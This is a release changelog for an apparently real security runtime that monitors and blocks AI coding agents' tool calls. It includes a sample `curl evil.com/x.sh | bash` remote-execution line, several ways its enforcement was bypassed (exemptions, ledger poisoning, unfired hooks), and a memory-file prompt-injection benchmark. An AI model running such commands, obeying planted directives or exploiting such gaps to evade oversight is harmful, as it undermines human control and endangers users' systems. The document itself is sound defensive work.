- **Resumable gateway sessions.** `prismor mcp-gateway --session-id` (or `PRISMOR_SESSION_ID`) pins a stable session id so hosted deployments that restore session state across restarts keep one continuous session — a fresh id per boot would orphan the restored trifecta ledger and reopen the wait-out-the-restart bypass. See #207.

### Fixed

- **Trifecta ledger poisoning (security).** A blocked call's tags were recorded in the session ledger anyway, marking the forbidden set as already covered — so after one denied critical call, every later same-tagged call was waved through. Additionally, `completes()` never fired on sets already fully present, turning an observe-period or restored ledger into a permanent bypass after flipping to enforce. Blocked enforce-mode crossover calls no longer record their tags, and a session that has entered the forbidden state stays restricted. See #207.
- **HTTP MCP upstreams behind CDNs.** The gateway's upstream client now sends a real `User-Agent` (`prismor-gateway/<version>`); urllib's default was rejected outright by common WAFs (Cloudflare returned 403 before the request reached the MCP server). See #207.

## [1.29.0] — 2026-07-19

### Added

- **Per-device observe/enforce override in the policy engine.** The signed policy can now carry `settings.device_mode`, a per-device kill switch scoped server-side to the requesting device. It wins over `rule.mode` and `default_mode` everywhere mode is resolved, but never downgrades the non-overridable enforce floor. Because the override lives on the Device row outside any policy-profile version, the version heartbeat now carries a `deviceMode` field and the runtime re-pulls the signed policy when it changes — a console toggle reaches the machine within one debounce interval.

## [1.28.0] — 2026-07-19

### Added

- **Local pause/resume without uninstalling hooks.** `prismor pause [--for 30m]` suspends screening (hooks stay installed and fail open with a "paused" marker) and `prismor resume` re-arms it; timed pauses auto-expire. Devices report a "paused" status to the control plane. See #204.
- **Scoped unblock steps on every enforcement block.** When a command is blocked, the block message now prints the narrowest concrete path to proceed — the exact `prismor unblock` invocation scoped to that rule/tool/session — instead of a generic pointer. New `prismor/runtime/unblock.py`. See #196.

## [1.27.0] — 2026-07-18

### Added

- **Token usage tracking.** Runtime now records real per-turn token usage (input / output / cache read / cache write) for Claude Code by reading the hook payload's existing `transcript_path` — no new data source — deduped on `message_id` so parallel tool calls from one assistant turn aren't multiply-counted. A tool-output-size proxy ("where tokens are going") works across every agent (claude, codex, copilot, cursor, …) from the normalized hook event, recorded post-only to avoid double-counting Pre/Post pairs. New `prismor tokens [--all] [--hours N] [--json]` command, plus a `/api/tokens` dashboard endpoint and "Token Usage" widget. See #202.
- **Passive update-available notice.** Commands nudge you when a newer prismor is on PyPI instead of relying on `prismor update --check`. Debounced to at most one PyPI hit per 24h (cached at `~/.prismor/update_check.json`), never fired on `hook-dispatch` (which runs on every tool call), and suppressable with `PRISMOR_NO_UPDATE_CHECK=1`. See #202.
- **Per-skill inventory and governance.** Every Claude Code skill invocation arrives under the single `Skill` tool tag; the skill's actual name lived only in the raw hook payload, so the control plane could see that an agent used skills but not which ones, and could only deny the whole mechanism. Skill invocations are now lifted into a qualified `Skill:<name>` tag and reported alongside the bare tag, so the console shows individual skills and policy can allow/deny one at a time — denying `Skill` still blocks all skills, denying `Skill:<name>` blocks only that one.

### Fixed

- **Cloaking output scrub no longer breaks on secrets with regex metacharacters.** The output scrubbers (`scrub-stream.sh`, `recloak-mcp.sh`) interpolated each raw secret value into a `sed -E` substitution as the pattern. Since sed treats it as a regex, a secret containing any metacharacter (`[ ] ( ) { } . * + ? ^ $ |`) either aborted sed with `unterminated substitute pattern` — dropping the *entire* command's output so every Bash tool call failed — or silently mangled output while leaving the secret only partially masked. Both hooks now use bash's literal substring substitution (`${var//"$real"/placeholder}`), a byte-exact match immune to any character a key can contain, and also correctly span newlines (sed only scrubbed line-by-line). See #203.

## [1.26.5] — 2026-07-15

### Fixed

- **Concurrent hook writes no longer corrupt the session log.** Several hook processes can fire for one tool call (`hook-dispatch` registered in both user and project settings, or parallel agents sharing a session id) and all append to the same session log. The record's JSON and its trailing newline were written as two separate calls, so a second writer could land between them and weld two records onto one line; large records also tore because they exceed the size below which appends are atomic. `read_session_events` then raised `JSONDecodeError` out of the hook path, so a single torn line failed every later tool call in that session and silently dropped policy enforcement until the log was hand-edited. Records are now written as one locked write, and logs already torn by earlier versions are salvaged on read instead of raising. See #197.

## [1.26.4] — 2026-07-14

### Fixed

- **Org tool-allow now overrides local restrictions.** The dashboard's "Allowed" toggle for a tool previously only meant "no org-level deny" — a local `.prismor/agents.yaml` deny or a session's synthesized scope could still silently block the call, so an admin's "Allowed" click sometimes appeared to do nothing. Org policy is now authoritative for tool access: an explicit org allow drops the matching local restriction, while the agent kill switch and a separate org-level deny stay non-overridable floors. See `docs/tool-access-precedence.md`.

## [1.26.3] — 2026-07-14

### Added

- **Enterprise agent tool-capability inventory and remote governance.** Runtime sessions now register MCP names, internal tools, declared SDK tool rosters, and synthesized session-scope access with the Prismor control plane. The dashboard can show which tools each agent/session has access to and apply organization-level allow/deny changes before delivery. LangChain, CrewAI, and OpenAI Agents adapters declare their complete tool roster, while direct runtime calls report observed and scoped tools. See `docs/enterprise-tool-access.md`.

## [1.26.2] — 2026-07-13

### Fixed

- **Interactive setup wizard now defaults to observe mode.** `prismor setup`'s TUI mode-selection step (and its exception fallback) defaulted to `enforce`, inconsistent with every non-interactive path (`--non-interactive`, `install-hooks`, the `policy_engine` fallback), which already default to `observe`. First-time users going through the interactive wizard now see `observe` pre-selected, matching the rest of the CLI. See #193.

## [1.26.1] — 2026-07-13

### Added

- **Kiro CLI (AWS) coding-agent hook integration.** Wires Kiro CLI (kiro.dev/docs/cli/hooks) into the install-hooks/hook-dispatch pipeline. Structurally different from every other shipped agent: hooks live inside a named agent config (`.kiro/agents/kiro_default.json`), not a dedicated hooks file, and the built-in default agent has no on-disk file until one is created. Whether Kiro merges a partial override with its built-in tool list or replaces it outright is undocumented, so a fresh install seeds a self-contained config (explicit tools list) rather than a hooks-only fragment, avoiding silently stripping a user's default tools; an existing file is left otherwise untouched, only `hooks` is merged in. `preToolUse`/`postToolUse`/`userPromptSubmit` events, exit-2 blocking. Not yet verified against a live kiro-cli binary. See #191.

## [1.24.1] — 2026-07-11

### Added

- **Grok Build (xAI) coding-agent hook integration.** Wires Grok Build (docs.x.ai/build/features/hooks) into the same install-hooks/hook-dispatch pipeline as Claude/Cursor/Codex/Copilot: a dedicated `.grok/hooks/prismor.json` hook file, `PreToolUse`/`PostToolUse`/`UserPromptSubmit` events, and Grok's documented `{"decision": "deny", "reason": ...}` + exit-2 response contract. Also fixes 8 call sites in `cli.py` where `--agent` choices/loops were hardcoded separately from `_SUPPORTED_AGENTS`, which would have made `--agent grok` unusable at the CLI layer. Not yet verified against a live `grok` binary — built from x.ai's published docs; flagged in `AGENT_INTEGRATIONS.md` and the integration registry. See #183.

## [1.24.0] — 2026-07-11

### Changed

- **DENY-wins precedence when multiple enforce findings fire on one event.** `should_block` returned whichever enforce finding the engine surfaced first, so a rule-ordering accident could let a `step_up`/`modify`/`defer` verdict mask a hard `block` on the same action. It now selects the strongest verdict — block > step_up > defer > modify, with enforce `warn`/`log`/unset ranking as block (enforce means "stop") and ties preserving first-surfaced order. Coverage in `tests/test_deny_precedence.py`.

## [1.23.0] — 2026-07-11

### Added

- **Intent capture for framework SDK agents (R2/R3 task-alignment).** The hook path synthesizes intent-scoped rules from the user's prompt; a deployed OpenAI Agents / LangChain / CrewAI / browser-use agent emitted no prompt, so its tool calls were checked against static policy only. `guard_agent` / `guard_tools` / `guard_controller` now accept `goal="..."`: the session's intent-scoped rules are synthesized from the goal + the agent's own tool names (via new `prismor/runtime/intent.py`), so `evaluate_tool_call`'s scoped enforcement now applies "does this serve the task?" to headless agents too. Idempotent per session, never raises. Coverage in `tests/test_intent_capture.py`.

## [1.22.0] — 2026-07-11

### Added

- **Tamper-evident, Ed25519-signed audit trail of every agent action.** The session store records tool calls as mutable SQLite/JSONL; the telemetry chain + receipt signatures covered only cloud-uploaded findings. Now every evaluated call — allowed, warned, blocked, or step-up — appends a hash-chained, Ed25519-signed record to `~/.prismor/audit/trail.jsonl`, capturing timestamp, device/agent/human identity + versions, secret-scrubbed inputs (`input_summary`, `evidence_hash`), the agent's stated intent, and the policy decision in human-readable terms (`verdict`, `rules`, `reason`). Human-approval outcomes from the headless step-up path are first-class `approval` records. Unlike the telemetry chain, `ts` and all fields are inside the hash (verification is local — no server round-trip constraint). New module `prismor/runtime/enterprise/audit_trail.py`, wired at the single chokepoint in `runtime.evaluate_tool_call`. Best-effort by default (a failed append is a verifiable seq gap); `PRISMOR_AUDIT_STRICT=1` fails the action closed, `PRISMOR_AUDIT_TRAIL=0` disables. Signing requires the `prismor[signing]` extra; without it records are chained but unsigned. Docs: `docs/audit-trail.md`; coverage in `tests/test_audit_trail.py`.
- **`prismor trail` CLI.** `verify` re-walks the chain (hashes, prev-hash linkage, seq monotonicity, signatures pinned to the device key — reporting `ok` / `gaps` / `tampered`, exit non-zero otherwise), `show` renders recent records, and `checkpoint` emits a signed chain head for anchoring outside the machine — which is what makes a trail+state rewind provable.
- **`audit-trail-tampering` policy rule (CRITICAL, non-overridable).** Blocks agent commands and file writes touching `~/.prismor/audit/`, `receipt_signing_key.pem`, or `telemetry_chain.json`. Added to the `_NON_OVERRIDABLE_RULE_IDS` floor so no project or remote override can disable it — the trail is evidence, and an agent must not be able to erase its own history.
- **Signed attestation bundle for auditors (`prismor attest`).** Packages the `prismor audit` posture sweep, the governed-agent inventory (`list_agents`), and the signed audit-trail head into one JSON file, then Ed25519-signs it over an RFC 8785 (JCS) canonical body so a verifier in any language can reproduce the signed bytes. `prismor attest --out FILE` writes it; `prismor attest verify FILE` re-checks the content hash and signature offline (exit non-zero on failure), with `--pubkey` to pin an out-of-band signer key so a wholesale-forged bundle is rejected. Reuses the existing signing, audit, inventory, and trail-checkpoint subsystems; new module `prismor/runtime/enterprise/attestation.py`, coverage in `tests/test_attestation.py`. Docs: `docs/attestation-bundle.md`.
- **Host discovery for shadow AI (`prismor discover`).** Sweeps this machine for supported AI agents (Claude Code, Codex, Cursor, Windsurf, OpenClaw, Hermes) and flags any that run without Prismor hooks — an agent making tool calls that never pass through policy. Classifies each as present (config or install dir on disk), governed (Prismor's dispatcher wired into its config), and seen (has actually run through Prismor, from the agent registry). The `ungoverned` count is the shadow-AI number. Host-local and read-only; it reads config files already on disk and does not touch the network (fleet-wide discovery is a separate, heavier tool). Reuses `scanner.py`'s config-location map and `agents.list_agents`. The same report lands in every attestation bundle under `discovery`. New module `prismor/runtime/enterprise/discovery.py`; coverage in `tests/test_discovery.py`. Docs: `docs/attestation-bundle.md#host-discovery`.
- **Framework-control coverage in the bundle (`prismor attest coverage`).** The bundle now reports which compliance-framework controls the active policy covers. Data-driven and forkable: one plain-YAML checklist pack per framework under `prismor/runtime/checklists/` (OWASP Top 10 for LLM Apps, OWASP Agentic AI Threats, NIST AI RMF, EU AI Act high-risk obligations) plus `crosswalk.v1.yaml` mapping Prismor rule IDs (and the audit-trail / step-up subsystems) to control IDs. A control counts as covered only while at least one mapped rule is active, so disabling the last rule behind a control flips it to uncovered — the report tracks real posture, not a static claim. `prismor attest coverage` renders it (`--json` for machine output). New module `prismor/runtime/enterprise/compliance.py`; coverage in `tests/test_compliance.py`, including guards that every crosswalk entry points at a real rule and a real control. Deliberately scoped as evidence of tool-boundary enforcement, not a legal compliance opinion.

## [1.21.1] — 2026-07-10

### Fixed

- **Framework-adapter namespace shims now refuse to load under a top-level name.** Each `prismor.<framework>` shim (`prismor/openai`, `prismor/crewai`, `prismor/langchain`, `prismor/browser_use`) aliases its implementation into `sys.modules`. That alias now fires only when the shim is imported under its intended dotted name; if the `prismor` package directory ever leaks onto `sys.path` and Python resolves the shim as a bare top-level module (e.g. `openai`), it raises a clear `ImportError` pointing at the sys.path pollution instead of silently replacing the real SDK with the adapter. Defense in depth complementing the sys.path fix (#173).


## [1.21.0] — 2026-07-10

### Added

- **R4 Phase 2 (part 1): async approval for headless STEP_UP.** A `step_up` verdict on an *interactive* agent renders an inline "ask" (Phase 1); a *headless* framework agent (OpenAI Agents / LangChain / CrewAI / browser-use) has no human at the keyboard, so it now posts a pending **approval request** to the control plane and blocks in-process until an org admin approves or denies — approve → the tool call proceeds; deny / timeout / not-enrolled / any error → fail closed. New client `prismor/runtime/enterprise/approvals.py` (`await_step_up`; tunables `PRISMOR_APPROVAL_TIMEOUT`, `PRISMOR_APPROVAL_POLL`) wired into all four SDK adapters. Control-plane endpoints: `POST /api/approvals` + `GET /api/approvals/{id}` (device-authenticated). Client coverage in `tests/test_approvals.py`. Until the control-plane queue is deployed the client fails closed, so behavior is unchanged for existing installs.

## [1.20.1] — 2026-07-10

### Fixed

- **MCP tool calls under Claude are now intercepted at the PreToolUse gate.** The Claude hook matcher omitted `mcp__.*`, so a raw `mcp__<server>__<tool>` call never fired the dispatcher and slipped past policy entirely — even though the dispatcher already classifies MCP events (remote MCP → egress / secret-in-args checks; local stdio → prompt-injection rules). Both the PreToolUse and PostToolUse matchers now include `mcp__.*` (matching the Codex agent's coverage). Re-run `prismor install-hooks --agent claude` to pick up the new matcher. Coverage + end-to-end block tests added.

## [1.20.0] — 2026-07-10

### Added

- **Ed25519-signed telemetry receipts (non-repudiation + identity binding).** Each enrolled device now holds an Ed25519 keypair and signs every telemetry receipt over a canonical `{hash, ts, identity}` payload — binding the immutable per-device chain hash to the receipt's service (device), agent, and human-principal identity claims and its timestamp. Records carry `signature`, `signing_pubkey`, `signing_key_id`, and `signing_alg`; the public key is registered at enrollment (`receipt_pubkey`) for control-plane verification and trusted-on-first-use pinning. This upgrades receipts from tamper-*evident* (keyless SHA-256 chain) to tamper-*evident + non-repudiable*: a forged or identity-swapped receipt no longer verifies without the device's private key. Signing needs the optional `cryptography` extra (`pip install "prismor[signing]"`); without it, telemetry falls back to the hash chain. New module `prismor/runtime/enterprise/receipt_signing.py`; coverage in `tests/test_receipt_signing.py`.

## [1.19.0] — 2026-07-10

### Added

- **Five-value authorization verdicts at the hook boundary.** Policy rules can now resolve to `action: step_up` or `action: modify` alongside `block`/`warn`/`log`. On the Claude surface a `step_up` finding emits a `PreToolUse` `permissionDecision: "ask"` for inline human approval (also honored by Copilot), and a `modify` finding rewrites the tool input through a named transform (`transform: sandbox` wraps the command in the Docker sandbox) via `hookSpecificOutput.updatedInput`. Any verdict a surface cannot honor fails closed to a block — never a silent allow. New transform registry in `prismor/runtime/transforms.py`; end-to-end coverage in `tests/test_r4_decisions.py`. `defer` is accepted by the policy validator but not yet emitted (fails closed pending the async-approval path).

## [1.18.4] — 2026-07-10

### Fixed

- **Framework SDK adapters no longer shadow the real SDK they wrap.** `prismor/runtime/semantic_guard_v2.py` prepended the `prismor` package directory to `sys.path` (a v1 relic), which made the PEP-420 namespace shims `prismor/openai`, `prismor/crewai`, `prismor/langchain`, and `prismor/browser_use` importable as top-level modules — so a plain `import openai` (or `crewai`/`langchain`/`browser_use`) resolved to the adapter shim and hijacked `sys.modules`, breaking the genuine SDK for every in-process adapter. The stray `sys.path.insert` is removed; the sibling heuristic import resolves through the installed `prismor` namespace without it. Regression test added.

## [1.18.3] — 2026-07-10

### Fixed

- **`prismor cloak run` now decloaks leading shell-style environment assignments such as `OPENAI_API_KEY=@@SECRET:OPENAI_API_KEY@@`.** Previously the Codex-owned cloak runner only resolved placeholders that appeared in positional argv entries, so normal shell patterns that passed a cloaked placeholder through a leading env assignment reached the child process as the literal `@@SECRET:...@@` string and downstream API calls failed with invalid credentials. The runner now splits leading `NAME=value` assignments, decloaks those values into the child environment, and preserves output scrubbing. Regression coverage now exercises both the Codex runner path and Claude's command-rewrite path.

## [1.18.1] — 2026-07-09

### Added

- **The local OSS dashboard now has a persistent dark theme toggle.** `prismor dashboard` stores a `light`/`dark` preference in `localStorage`, applies it before first paint to avoid flash, adds a top-bar theme toggle, and re-themes the Chart.js visualizations so the graphs remain legible in dark mode instead of leaving the dashboard half-light.

## [1.17.10] — 2026-07-08

### Fixed

- **Scoped session controls now support the exact observed tool tags Prismor records, including MCP-style tags like `mcp__node_repl__js`.** The session drilldown editor no longer limits operators to a narrow preset when the live event stream shows a concrete tool tag; arbitrary observed tags are accepted end-to-end, persisted in scoped session policy, and enforced by the runtime so teams can deny or allow the exact tool they just saw in the dashboard.

## [1.17.9] — 2026-07-08

### Fixed

- **Revoked devices now fully fall back to local-only protection instead of continuing to look enterprise-enrolled on the laptop.** Previously, removing a device from `prismor.dev` only caused control-plane calls to back off after a `401/403`, but the local runtime still treated the presence of `~/.prismor/identity.json` as active enrollment: the dashboard banner still said “This device is enrolled…”, workspace scope could still resolve as org-managed, and the cached enterprise policy layer could still appear locally. Revocation now disables active enrollment, forces workspace scope back to `local`, hides the enterprise policy layer from the local dashboard, and ignores cached remote policy until the machine is re-enrolled. Local Prismor protection still stays on. 

## [1.17.1] — 2026-07-07

### Added

- **`prismor cloak add --env-file .env` now bulk-imports dotenv secrets natively.** Each `KEY=VALUE` entry is registered as its own placeholder (`@@SECRET:KEY@@`) inside the existing cloaking store, so teams can enroll a whole `.env` file without wrapping the CLI in an external script. The importer accepts standard dotenv forms like `export KEY=...` and quoted values, rejects malformed or empty entries with a clear line-numbered error, and is documented across the CLI reference and cloak docs.

## [1.17.0] — 2026-07-07

### Fixed (security)

- **Codex: Bash reads of files containing a registered secret are now blocked and redirected to the `@@SECRET:name@@` placeholder.** Codex hooks are block-only — a `PreToolUse` hook cannot rewrite a command or its output (verified against `codex-cli 0.141`), so the wrap-and-scrub decloak approach used for Claude doesn't port. Without a guard, a Bash command reading a file that holds a registered secret surfaced the raw value straight into model context. A new Codex-scoped read-guard denies matching reads (exit 2) in enforce mode, fails open on any error, and covers file-read vectors (`cat`/`grep`/`base64`/`source`/redirection/etc.); env-var echo and unregistered pattern-only secrets on Codex remain out of scope pending Codex output-rewrite support. (#152)
- **Poisoned `CLAUDE.md`/`AGENTS.md` content — a compromised PR, template repo, or stale checkout carrying an embedded operational directive — is now flagged instead of silently followed.** Project-memory files were read at session start but their content was never scanned; benchmarked as OWASP Agentic Top-10 ASI06, 24/24 runs followed an embedded `touch <marker>` directive with 0 blocked. New `memory-embedded-directive` rule (category `memory_poisoning`, warn) requires an action/exfil/steering signal — a command to run, a remote fetch, or a covert behavior override like "never mention X to the user" — so routine style-convention docs don't false-positive; validated 7/7 attack phrasings flagged, 0/4 false positives on realistic convention docs. Warn rather than block, since `memory_poisoning` is deliberately not a block category. (#153)
- **Project-memory files (`CLAUDE.md`/`AGENTS.md`) are now subject to the same policy-engine scrutiny as tool output**, closing a gap where a memory file could authorize an action that would otherwise be blocked coming from a tool result. A new Claude `SessionStart` hook emits memory-file content (workspace, ancestors, and `~/.claude`, capped at 64KB) as a `memory` event; `CompiledRule` folds `memory` into every rule that scrutinizes `tool_result` at load time, so no current or future block-category rule can silently exempt the project-memory source. Findings are now tagged with `source` provenance (`user_prompt`/`tool_output`/`project_memory`) for telemetry/dashboard attribution. (#155)
- **The `SessionStart` memory scan (#155) resolved `CLAUDE.md`/`AGENTS.md` against the hook's install-time `workspace`, not the live session's working directory** — for a common `--scope user` (global) install, every session on the machine scanned the same fixed directory's memory files regardless of which project was actually running, so the #155 fix had no effect outside a project-scoped install. Now prefers the live `cwd` already present in the hook payload, falling back to `workspace` only when absent. (#155)

### Fixed

- **Repo-local CLI entry points can no longer be shadowed by an unrelated installed `prismor` package.** The source checkout previously relied on a PEP 420 namespace package at the top-level `prismor/` directory. On hosts that already had another `prismor` distribution on `sys.path`, `bin/prismor` could import that foreign package first and then fail with `ModuleNotFoundError: prismor.runtime`, leaving operators testing the wrong runtime or no runtime at all. The checkout now ships a real top-level `prismor/__init__.py`, and `tests/test_cli.py` covers the shadowing case directly. This was reproduced during a live runtime-enforcement benchmark on July 6, 2026. (#150)

## [1.16.0] — 2026-07-04

Batches five PRs of fixes found during an extended feature-by-feature security
audit (framework adapters, exemption/policy-layer floor protections, the
skill scanner, the learning engine, and the Codex integration), including two
live security bypasses.

### Fixed (security)

- **Codex hooks never dispatched at all unless `[features].hooks` was already manually enabled in `~/.codex/config.toml` — a complete, silent bypass.** `prismor install-hooks --agent codex` correctly wrote `.codex/hooks.json`, but Codex's own hook dispatcher requires this separate, undocumented opt-in (previously `codex_hooks`, deprecated in current stable) in the *user-level* config only — not even a project-scoped `.codex/config.toml`. Without it, `PreToolUse`/`PostToolUse`/etc. are silent no-ops: no error, no warning, every tool call passes straight through. Verified live against `codex-cli 0.142.5`: on a fresh install with the flag unset, a command matching the `lockfile-deletion` rule ran and deleted its target file. `install_hooks()` now sets/migrates this flag automatically whenever codex hooks are installed. (#149)
- **A repo exemption could fully disable the `remote-execution` (curl\|bash RCE) rule, defeating live enforcement.** `_CORE_BLOCK_CATEGORIES` (protects a finding's `mode`) and `_NON_OVERRIDABLE_RULE_IDS` (protects `enabled`/`patterns`) were meant to describe the same floor, but `remote_execution` was only in the former — every other core category had a matching protected rule id except this one. An exemption setting `{"id": "remote-execution", "enabled": false}` removed the rule entirely; `curl evil.com/x.sh | bash` produced zero findings and `should_block()` returned allow. The floor-protection check now also matches by category, so this class of drift can't recur. (#140)
- **A repo exemption could corrupt a floor rule's `action`/`severity` without ever touching `enabled`**, e.g. `{"id": "destructive-command", "action": "allow", "severity": "LOW"}`. Live interactive enforcement wasn't bypassed (`should_block()` reads the separately-clamped `mode`), but `prismor check`'s CLI exit code and display — and anything else that reads a finding's `action` directly (CI gates, SARIF, dashboards) — were: the corrupted finding reported as clean/low-severity. `action`/`severity` are now restored to the default rule's values the same way `patterns` already was. (#141)
- **`bind-all-interfaces`'s generic flag pattern could never match.** `\b` before a `--host`/`--bind`/`--listen` flag is a no-op (`-` isn't a word character), so this pattern was dead code — only the hardcoded framework-name list and colon-port form caught anything. Any custom tool binding to `0.0.0.0` via a space-separated flag evaded detection entirely unless it happened to be named uvicorn/gunicorn/flask/node/python/ruby. (#142)

- **browser-use adapter: real network/file actions were misclassified and their URLs/paths silently dropped.** `_extract_event_fields()` only handled pydantic-model-shaped or plain-object params, not the plain `dict` the current browser-use `Registry.execute_action` actually passes — every extracted field fell back to the literal string `"{}"`. The hardcoded action names were also stale (`go_to_url`→now `navigate`, `search_google`→`search`, `save_pdf`→`save_as_pdf`). Together this meant `suspicious-network`/`secret-in-url-params` never saw real URLs against current browser-use, despite docs claiming this was "live-validated." Existing tests mocked params with `MagicMock`, which auto-satisfies the pydantic-shaped branch and never exercised the real path. (#135)
- **vercel-ai adapter: fail-open didn't cover the eval-server-unreachable case.** The documented fail-open guarantee only handled a non-2xx HTTP response; an actual `fetch()` failure (connection refused — i.e. eval-server not started, the literal scenario named in the docs) threw uncaught and crashed the calling code instead of failing open. (#136)

- **Direct writes to `/etc/passwd`, `/etc/shadow`, and `/etc/sudoers` are now blocked.** The `path-traversal` rule flagged reads of these paths but never `file_write`, and no other rule covered writes — a `Write`/`Edit`-style tool call (or any SDK adapter call) targeting them passed silently in enforce mode. New `auth-file-write` rule (CRITICAL/block) covers both the shell-redirect and direct-path-write forms. (#127)
- **`PRISMOR_HOME` is now honored consistently across subsystems.** IAM, canary, and named-agent global config all hardcoded `Path.home()` regardless of `$PRISMOR_HOME`. More importantly, `store.py` had its own duplicate `_secrets_dir()` (missing the `$PRISMOR_HOME` fallback tier that cloak's `secrets_dir()` has — used by the session-store's own secret-scrubbing safety net) and duplicate `get_enrollment()` (no override at all, used by the dashboard) that disagreed with the versions used elsewhere in the CLI. All now resolve through a single `prismor_home()` helper. (#131)
- **`uninstall-hooks --agent claude`/`all` now announces when it also removes cloaking hooks.** This was already happening silently (cloak hooks share `.claude/settings.json` with the runtime-monitor hooks and get cleaned up as a side effect) with no indication that secret protection had been disabled; it's now called out explicitly in the command output, `--help`, and the CLI reference. (#126)

### Fixed

- Dashboard "Findings" tab (`/api/findings`) always returned zero results — the query correlated an outer column inside a subquery's `OFFSET` clause, which SQLite rejects (`no such column`), and the exception was silently swallowed. Rewritten using a `ROW_NUMBER()` join instead of the unsupported correlated `OFFSET`. (#129)
- Dashboard "Events" tab (`/api/events`) showed every event in a session as `verdict: "blocked"`/`severity: "critical"` if the session contained *any* finding, even fully-allowed actions — verdict/severity are now resolved per event instead of per session. (#130)
- `write_supply_chain_event()` never set `event_index` on the findings it recorded, so a blocked `supplychain npm install`/`pip install`/etc. showed as `verdict: "allowed"` in the dashboard's Events tab (its finding could never resolve back to its own event). (#134)
- `prismor policy validate` crashed with an unhandled Python traceback on malformed YAML instead of reporting a clean validation error. (#128)
- `docs/cli-reference.md` no longer lists `workspace show` / `exempt status` as subcommands — neither exists (`workspace` with no argument shows status; `exempt` only has `request`). (#132)
- `docs/frameworks-crewai.md`'s examples imported `from crewai_tools import tool` — a separate package not installed by `pip install "prismor[crewai]"` and not mentioned anywhere in the doc. Changed to `from crewai.tools import tool`, which ships built-in with current `crewai` and requires no extra install. (#137)
- `prismor scan` mislabeled the `agent` for any config whose full path happened to contain another agent's name as a substring (e.g. a workspace path containing "claude" anywhere caused a real Cursor/Windsurf/etc. config's findings to be reported under `agent: "claude"`) — `parse_config()` re-guessed the agent via path substring matching instead of using the value `discover_configs()` already knew. (#143)
- `docs/learning.md`'s own worked example (a recurring `psql ... prod` command) could never actually be mined — no database client was in the learning engine's `_SENSITIVE_COMMANDS` allowlist. Added `psql`/`mysql`/`mysqlsh`/`redis-cli`/`mongosh`/`sqlite3`. (#146)
- `prismor learn --apply` wrote `.prismor/policy.yaml` without the required `version` field when no policy file existed yet, so the docs' own next step (`prismor policy validate`) failed immediately with "Missing required field: version" — even though the learned rule worked correctly at runtime. (#147)

### Added

- Regression tests for all four framework adapters now exercise their real framework's actual objects (`agents.Agent`/`FunctionTool`, `langchain_core.tools.Tool`, `crewai.tools.tool`/`BaseTool`, `browser_use.Controller`) rather than bare callables or mocks — gated with `importorskip`/`skipif` so they run when the framework is installed and skip cleanly otherwise. `langchain` and `crewai` had no adapter tests at all before this; `openai-agents` and `browser-use` only tested the framework-agnostic fallback path. This is exactly the gap that let #135 ship undetected. (#138)
- `adapters/vercel-ai` gained its first test suite (`npm test`, Node's built-in test runner, no live eval-server needed — global `fetch` is stubbed), covering the fail-open fix above.
- **`prismor scan` now actually discovers and scans Claude Code Skill files** (`.claude/skills/<name>/SKILL.md`), not just JSON-shaped MCP server configs and OpenClaw's `skills` list — this is the real, primary "community skill contains malicious patterns" attack surface the `skill-exfil-url`/`skill-encoded-payload` rules exist for, and it was previously never discovered at all. Also fixed `skill-shell-injection`'s bare `` `[^`]+` `` backtick pattern, which matched any markdown inline-code span — a massive false-positive generator now that real skill prose is actually scanned; narrowed to real `$(...)` command substitution. (#144)

## [1.15.1] — 2026-07-04

### Fixed

- `release.yml` now derives the `immunity-agent` redirect shim's version and `prismor>=` dependency floor from `prismor/runtime/__init__.py` at release time instead of relying on a hand-maintained copy in `packaging/immunity-agent-shim/pyproject.toml`. The `1.15.0` release published `prismor` correctly but the shim publish step failed (`400 File already exists`) because its hardcoded version hadn't been bumped past `1.14.2`. Both PyPI publish steps also now pass `skip-existing: true` so a re-run after a partial failure doesn't hard-fail on the artifact(s) that already published successfully.

## [1.15.0] — 2026-07-04

First release published under the **`prismor.runtime`** namespace — the internal `warden` package name is fully retired. Also closes several cloak and policy gaps that shipped in source after `1.14.2` was cut but were never released.

### Changed

- **Renamed the runtime package to `prismor.runtime`** (from `warden`) — the `prismor`/`immunity` (deprecated alias) console scripts now point at `prismor.runtime.immunity_cli:main`. No command-line behavior changes.
- **`prismor.*` namespace imports for framework adapters** — the Python adapters are now importable as `from prismor.openai import guard_agent`, `from prismor.langchain import guard_tool`, `prismor.crewai`, and `prismor.browser_use` (PEP 420 namespace packages; adapter distributions bumped to 0.2.0). The old flat `prismor_*` module names keep working as aliases of the same module objects.
- Dashboard: new agent control tab, enterprise upsell panel, refreshed site fonts.
- Telemetry: guard-eval latency and matched-pattern fields, tamper-evident hash chain, new `prismor doctor` command for a one-shot health check (hooks, policy, enrollment, remote policy signature, telemetry sink/spool, integrity chain).
- CI now gates cloaking + policy tests as a dedicated security-regression suite on every PR.

### Fixed (security)

- **Cloak now scrubs secrets from all Bash output, not just placeholder substitutions.** `decloak.sh` wraps every Bash command's combined stdout/stderr once any secret is registered, closing the leak path where a value is read straight out of a file (`cat .env`, `grep KEY config`) without ever passing through an `@@SECRET:name@@` placeholder. New `read-guard.sh` hook denies a `Read` of any file that contains a registered secret.
- Cloak blocks `@file` mentions of secret-bearing files (Claude Code's `@`-mention shorthand), closing another path a raw secret could reach the model's context.
- **World-writable `chmod`/`chown` bypass closed in the live policy engine, not just the legacy pattern set** — `chmod 666`, `chmod 0777`/`1777`, `chmod -R 777 <any dir>`, and symbolic grants (`a+rwx`, `o+w`, `ugo+rwx`) are now blocked in enforce mode across `prismor check`, real hook dispatch, and every SDK adapter. (#121)
- CLI `--help`/usage output and `--version` no longer say `immunity` / `immunity-agent` — both now report `prismor`. (#124)
- `scripts/install.sh` now verifies the `prismor` resolved on `$PATH` actually matches the version it just installed, and fails loudly instead of reporting success when a stale/conflicting prior install (e.g. an old `easy_install` script or leftover `immunity-agent` venv) shadows it. (#123)
- Adapter distributions now depend on `prismor>=1.13.0` instead of the deprecated `immunity-agent` package name.
- The wheel now bundles the framework docs (`frameworks-*.md`), `sdk-integration.md`, and `connecting-to-the-platform.md` under `prismor/runtime/data/docs/`, so links from the installed skill's `SKILL.md` resolve.
- Post-install banner and `scripts/init.sh` no longer reference the old `immunity-agent` name/repo; `package.json` metadata updated to `prismor`.

## [1.13.0] — 2026-06-29

First release published to PyPI under the new **`prismor`** package name. `immunity-agent` is now a deprecated redirect package.

### Changed

- **`prismor` is the canonical PyPI package** — `pip install prismor` is the supported install path going forward. The package ships the full Prismor runtime, supply-chain engine, and CLI (`prismor`, with `immunity` kept as a deprecated alias).

### Deprecated

